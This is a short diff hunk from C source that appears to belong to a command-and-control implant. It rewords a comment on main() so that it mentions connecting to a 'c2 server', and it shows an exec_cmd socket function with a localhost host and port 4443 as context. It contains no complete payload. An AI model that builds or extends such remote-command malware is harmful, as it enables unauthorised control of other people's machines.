@@ -151,7 +151,7 @@ int exec_cmd(SOCKET connect_socket, char *buf) {
 	return iResult;
 }
 
-// Main function for handling parsing c2 commands.
+// Main function for connecting to c2 server & parsing c2 commands.
 int main(void) {
 	const char host[] = "127.0.0.1";
 	const int port = 4443;
